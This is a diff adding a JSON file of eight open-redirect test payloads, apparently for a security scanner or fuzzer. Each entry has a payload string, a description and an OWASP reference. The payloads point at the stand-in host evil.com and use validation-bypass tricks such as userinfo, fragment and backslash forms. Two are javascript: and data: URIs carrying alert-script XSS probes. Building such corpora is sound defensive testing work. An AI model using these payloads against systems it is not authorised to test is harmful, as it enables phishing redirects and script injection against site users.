@@ -1,0 +1,82 @@
+[
+  {
+    "id": "oredir-001",
+    "family": "open_redirect",
+    "subtype": "basic",
+    "payload_string": "http://evil.com",
+    "context": "url",
+    "description": "Basic open redirect to external domain",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-002",
+    "family": "open_redirect",
+    "subtype": "basic",
+    "payload_string": "//evil.com",
+    "context": "url",
+    "description": "Open redirect using protocol-relative URL",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-003",
+    "family": "open_redirect",
+    "subtype": "basic",
+    "payload_string": "/\\evil.com",
+    "context": "url",
+    "description": "Open redirect using backslash to confuse URL parser",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-004",
+    "family": "open_redirect",
+    "subtype": "bypass",
+    "payload_string": "http://evil.com%23legitimate.com",
+    "context": "url",
+    "description": "Open redirect using URL fragment to bypass validation",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-005",
+    "family": "open_redirect",
+    "subtype": "bypass",
+    "payload_string": "http://legitimate.com@evil.com",
+    "context": "url",
+    "description": "Open redirect using userinfo to bypass domain validation",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-006",
+    "family": "open_redirect",
+    "subtype": "basic",
+    "payload_string": "javascript:alert(1)",
+    "context": "url",
+    "description": "Open redirect to javascript URI for XSS chaining",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-007",
+    "family": "open_redirect",
+    "subtype": "bypass",
+    "payload_string": "http://evil.com?.legitimate.com",
+    "context": "url",
+    "description": "Open redirect using query string to bypass validation",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  },
+  {
+    "id": "oredir-008",
+    "family": "open_redirect",
+    "subtype": "basic",
+    "payload_string": "data:text/html,<script>alert(1)</script>",
+    "context": "url",
+    "description": "Open redirect using data URI for XSS",
+    "references": ["https://owasp.org/www-community/attacks/Open_Redirect"],
+    "platform_specific": {}
+  }
+]
